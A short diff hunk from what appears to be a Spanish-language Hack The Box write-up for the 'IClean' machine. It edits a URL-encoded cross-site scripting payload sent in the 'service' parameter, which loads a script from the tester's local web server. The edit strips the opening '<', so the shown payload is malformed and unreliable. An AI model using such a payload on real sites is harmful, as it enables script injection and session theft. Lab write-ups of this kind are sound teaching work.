@@ -60,7 +60,7 @@ python3 -m http.server 80
 
 2. Payload utilizado en la solicitud para la variable "**service**".
 ```bash
-<script+src%3d"http%3a//10.10.14.x/test"></script>
+script+src%3d"http%3a//10.10.14.x/test"></script>
 ```
 
 ![](/assets/images/htb-writeup-iclean/Pasted image 20240605164714.png)
